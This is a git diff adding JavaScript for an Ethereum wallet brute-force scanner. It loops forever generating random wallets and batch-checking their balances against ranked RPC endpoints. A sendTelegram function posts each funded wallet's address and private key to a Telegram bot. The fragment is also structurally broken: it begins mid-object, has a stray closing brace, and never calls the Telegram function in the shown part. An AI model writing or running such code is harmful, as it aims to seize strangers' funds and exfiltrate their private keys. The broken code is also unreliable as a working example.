@@ -52,3 +52,72 @@ function rawRequest(url, body) {
         req.end()
     })
 }
+        jsonrpc: '2.0', method: 'eth_getBalance',
+        params: [w.address, 'latest'], id: i,
+    }))
+    const body = JSON.stringify(requests)
+
+    // Try best RPC first, fallback to next best on error
+    const sorted = [...rpcPool].filter(r => r.alive).sort((a, b) =>
+        (a.latency + a.errors * 300) - (b.latency + b.errors * 300)
+    )
+
+    for (const rpc of sorted) {
+        const t = Date.now()
+        try {
+            const responses = await rawRequest(rpc.url, body)
+            const elapsed = Date.now() - t
+            rpc.latency = Math.round(rpc.latency * 0.7 + elapsed * 0.3)
+            rpc.errors = Math.max(0, rpc.errors - 1)
+            rpc.alive = true
+
+            if (!Array.isArray(responses)) continue
+
+            const funded = []
+            for (const res of responses) {
+                if (res.result && BigInt(res.result) > 0n) {
+                    funded.push({ wallet: wallets[res.id], balance: BigInt(res.result) })
+                }
+            }
+            return { checked: wallets.length, funded }
+        } catch (e) {
+            rpc.errors++
+            if (rpc.errors >= 4) rpc.alive = false
+        }
+    }
+    return { checked: wallets.length, funded: [] }
+}
+
+// ─── Telegram ─────────────────────────────────────────────────────────
+function sendTelegram(address, privateKey, ethStr) {
+    const token = process.env.TELEGRAM_BOT_TOKEN
+    const chat = process.env.TELEGRAM_CHAT_ID
+    if (!token || !chat) return
+    const msg = `🚨 <b>FUNDED WALLET</b>\nAddress: <code>${address}</code>\nKey: <code>${privateKey}</code>\nETH: ${ethStr}`
+    const body = JSON.stringify({ chat_id: chat, text: msg, parse_mode: 'HTML' })
+    const req = https.request({
+        hostname: 'api.telegram.org',
+        path: `/bot${token}/sendMessage`,
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
+    })
+    req.on('error', () => {})
+    req.write(body)
+    req.end()
+}
+}
+
+// ─── Main loop ────────────────────────────────────────────────────────
+async function run() {
+    while (true) {
+        const wallets = Array.from({ length: BATCH_SIZE }, generateWallet)
+        const { checked, funded } = await batchCheckBalances(wallets)
+        for (const { wallet, balance } of funded) saveFunded(wallet, balance)
+        process.send({ type: 'stats', checked, funded: funded.length })
+    }
+}
+
+run().catch(e => {
+    process.send({ type: 'error', msg: e.message })
+    process.exit(1)
+})
